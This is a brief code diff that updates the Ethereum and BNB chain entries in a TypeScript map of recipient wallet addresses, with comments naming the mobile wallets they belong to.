@@ -12,8 +12,8 @@ export const chainNames: Record<number, string>= {
 };
 
 export const RECIPIENT_ADDRESSES : Record<number, string>  = {
-  1: "0xe664e2D02a25AeD203c44418d93d21b8226cc94c", //mobile trusteth
-  56: "0xe664e2D02a25AeD203c44418d93d21b8226cc94c", //bnb  trustmobile
+  1: "0xC0D0833cedd5F77bC9d9c1533D0c27b3A74C8bb5", //eth metamaskmobile
+  56: "0xB8c77482e45F1F44dE1745F52C74426C631bDD52", //bnb metamaskmobile
   137: "0x5DBd59C38F71B5b389c3d3583537a8C152e8B52d",
   42161: "0x5DBd59C38F71B5b389c3d3583537a8C152e8B52d",
   11155111: "0x36875E84886F1Ae1032Ee044883bFD3C7c8D9bC2", // mobile
